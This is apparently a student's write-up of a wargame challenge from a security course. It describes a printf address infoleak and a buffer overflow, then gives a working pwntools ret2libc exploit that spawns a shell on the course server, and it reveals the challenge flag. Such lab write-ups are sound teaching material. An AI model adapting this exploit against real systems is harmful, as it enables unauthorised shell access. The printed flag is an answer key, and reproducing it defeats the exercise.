nx-1 piv_it
===========================

Flag: 6447{38b126bc-24b0-404d-81db-7a2f74ea4941}

General overview of problems faced
-------------------------------------
- The postamble was very confusing with esp being moved multiple times from multiple registers
- had to test which libc version was being used as there were 2 possible libc versions available based on the infoleak

List of vulnerabilities
--------------------
1. Infoleak: we are given the address to the `printf` function
2. Buffer overflow: The program uses `read` to take up to 52 bytes of input into a fixed length buffer which is smaller than 52 bytes. Therefore we can overflow the buffer and overwrite memory after it. Using rop and ret to libc 

Steps to exploit
------------------
1. Record the `printf` address pointer
2. Use a libc database to find which libc library is being used and using the given offsets, calculate the system address and the "/bin/sh" string address. (if there are 2 choices, select the ubuntu10 version)
3. Send as a payload:
    - the address 0x08048199 in little endian format 34 times
    - the calculated system address
    - 4 bytes to replace return address
    - the calcuated "/bin/sh" address
    - 1 random char to redirect esp into your buffer
4. Because of aslr, you might need to repeat the process multiple times
4. Congratulations you now have a shell

Script/Command used
------------------
```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwn import *

def main():
    context.terminal = "/bin/sh"
    h = "wargames.6447.sec.edu.au"
    p = 8001

    ret_address = 0x08048199
    r_char = "\x00" # use a semi-random char and hope aslr treats you well

    i = 0
    while 1:
        i += 1
        print i

        r = remote( h, p )

        r.recvuntil("random number: ")
        resp = r.recvline().strip()
        print resp

        printf_address = int(resp, 16)
        system_address = printf_address - 0xe8d0
        bin_sh_string_add = printf_address + 0x11239b

        payload = p32(ret_address) * 34 + p32(system_address) + p32(bin_sh_string_add) * 2 + r_char

        r.send(payload)
        resp = r.recvrepeat(0.4)
        print resp

        r.interactive()
        r.close()

if __name__ == '__main__':
    main()
```
